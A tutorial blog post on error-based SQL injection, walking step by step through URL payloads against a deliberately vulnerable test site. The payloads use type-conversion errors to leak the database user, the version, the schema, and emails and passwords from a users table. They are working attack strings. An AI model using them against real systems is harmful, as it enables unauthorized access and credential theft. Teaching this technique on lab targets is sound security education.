---
title: "Error Based SQL Injection"
categories:
- OWASP Vulnerability
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2015-02-24-error-based-sql-injection
tags:
- SQL Injection
- Union based SQL Injection
- Error Based SQL Injection
- Ethical hacking
- Bug Bounty
- Application Security
- OWASP Top 10
---

## What is Error Based SQL Injection?

Error-Based SQL Injection is a type of SQL injection attack in which an **attacker intentionally triggers database errors to extract information about the database structure, underlying queries, or sensitive data**. The application returns detailed database error messages that reveal sensitive information, enabling the attacker to craft more targeted SQL injection attacks.

## Attack Scenario

To Identified SQL injection, I will follow the same as I followed in Union based SQL injection. I will insert a single quote `(’)` in the vulnerable parameter to break backend query.

Here I used a vulnerable application which is intentionally vulnerable to Error Based SQL Injection attack.

```
http://testasp.vulnweb.com/showforum.asp?id=1

```
Insert a single quote `(’)` to the parameter, it breaks the backend query and through an SQL error.

![sqlerror](sqlerror.png)

Next step is to fix the error, to do that I will comment the rest query using `(--+) or (--)`.

In error based SQL injection we don't need to find out number of columns, we directly extract table name, column name.

First I enumerate for current user, and used below query.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int, (select current_user))--+  

```

![currentuser](currentuser.png)

Here, the application attempts to convert the input into an integer. When the conversion fails, it generates an error message, which is the behavior we are looking for during testing.

Enumerate version details.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int, (select @@version))--+

```

![version](version.png)

Now enumerate database name.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int, (select db_name()))--+

```

![dbname](dbname.png)

Enumerate table name

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int, (select top 1 table_name from information_schema.tables))--+

```

![tablename](tablename.png)

Enumerate table name which were on the top in database. To enumerate second table name I used NOT IN. 

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('threads')))--+

```

![seconttablename](seconttablename.png)

To enumerate all the table name, we will follow the same steps.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('threads', 'users')))--+

```

Now enumerate column name.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))--+

```

![columnname](columnname.png)

Enumerate all the column name

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users' and column_name not in ('uname','upass','email','realname','avatar')))--+

```

![allcolumnname](allcolumnname.png)

After identified table name and column name, we will enumerate email and password. To enumerate email, we will use below query.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 email from users))

```

![email](email.png)

To enumerate password we will use below command.

```
http://testasp.vulnweb.com/showforum.asp?id=1 and 1=convert(int,(select top 1 upass from users))

```

![pass](pass.png)

I successfully enumerated the email addresses and password values from the users table.

